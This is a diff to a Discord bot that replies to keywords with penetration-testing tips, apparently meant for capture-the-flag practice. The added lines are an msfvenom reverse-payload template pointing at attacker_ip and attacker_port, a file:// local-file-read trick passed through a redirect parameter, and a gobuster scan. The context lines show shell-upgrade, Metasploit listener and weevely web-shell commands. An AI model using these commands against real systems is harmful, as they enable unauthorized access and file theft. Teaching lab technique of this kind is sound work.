@@ -98,6 +98,7 @@ async def on_message(message):
             await channel.send("I suggest starting with some of these tools:")
             await channel.send("--nmap -sCSV -oA IP/NAME IP -Pn -p 0-65535")
             await channel.send("--dirb http://IP >> dirb_out.txt")
+            await channel.send("--gobuster dir -w /usr/share/dirb/wordlists/big.txt -u http://IP -x php,html >> gobuster.txt")
             await channel.send("--cewl http://IP -d # -w cewl_wordlist.txt")
             await channel.send("--burpsuite")
             await channel.send("--nikto -h http://IP")
@@ -132,6 +133,7 @@ async def on_message(message):
             await channel.send("""--python -c 'import pty; pty.spawn("/bin/bash")' #upgrades nc shell to full TTY shell for su change""")
             await channel.send("--msfconsole use /exploit/multi/handler #metasploit payload listener")
             await channel.send("--weevely generate weevely_payload.php password & to connect: weevely http://filepath password")
+            await channel.send("--msfvenom -p payload -e encoder lhost=attacker_ip lport=attacker_port -f format(raw or spec payload)")
             break
 
     for i in lpshell:
@@ -159,7 +161,10 @@ async def on_message(message):
         if i in message.content.lower():
             await channel.send("Tips:")
             await channel.send("--apache2 servers sometimes store weblogins in /etc/apache2/.htpasswd")
+            await channel.send("--webservers store local files /var/www/html")
             await channel.send("--checking if there's a robots.txt file in web dir can help with dir traversal")
+            await channel.send("--http http://IP/file_with_redirect.ext (apt-get install httpie)")
+            await channel.send("--if page w/ redirect has file_with_redirect.ext?url=redirect.php : http http://IP/file_with_redirect.php\?url\=file:///filepath")
             await channel.send("--if /etc/knockd.conf present then look inside for 3 port #s, use this one liner to open a closed port: for x in PORT1 PORT2 PORT3; do nmap -Pn --max-retries 0 -p $x IP; done")
             await channel.send("--Google and question everything! Research services, programs, and exploits!")
             await channel.send("--if target is running on wordpress or has wordpress plugins run: wpscan --url IP to scan for vulnerable plugins and enumerate")
